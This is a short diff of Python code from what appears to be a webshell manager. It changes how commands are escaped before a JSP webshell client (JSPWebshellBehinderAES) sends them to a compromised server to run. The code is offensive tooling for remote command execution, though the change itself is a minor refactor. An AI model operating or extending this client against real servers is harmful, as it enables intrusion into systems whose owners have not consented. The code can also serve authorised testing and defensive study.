@@ -1,8 +1,9 @@
 from pathlib import Path
 import base64
 import hashlib
+import json
 import logging
-import re
+import string
 import subprocess
 import typing as t
 import tempfile
@@ -32,6 +33,17 @@ PAYLOAD_PATH = Path(__file__).parent / "Payload.java"
 assert PAYLOAD_PATH.exists(), f"Cannot find Payload.java at {Path(__file__).parent}"
 
 # TODO: 把这些函数移动到utils里
+
+
+def java_repr(s):
+    return '"' + "".join(
+        (
+            c
+            if c in string.ascii_letters or c in string.digits
+            else hex(ord(c)).replace("0x", "\\x")
+        )
+        for c in s
+    ) + '"'
 
 
 def md5_encode(s):
@@ -158,7 +170,7 @@ class JSPWebshellBehinderAES:
             ) from exc
 
     async def execute_cmd(self, cmd: str) -> str:
-        return "".join(await self.submit_code(f"runCommand({cmd!r});"))
+        return "\n".join(await self.submit_code(f"runCommand({json.dumps(cmd)});"))
 
     async def test_usablility(self) -> bool:
         return (await self.submit_code("ping();"))["name"] == "EtherGhost JSP"
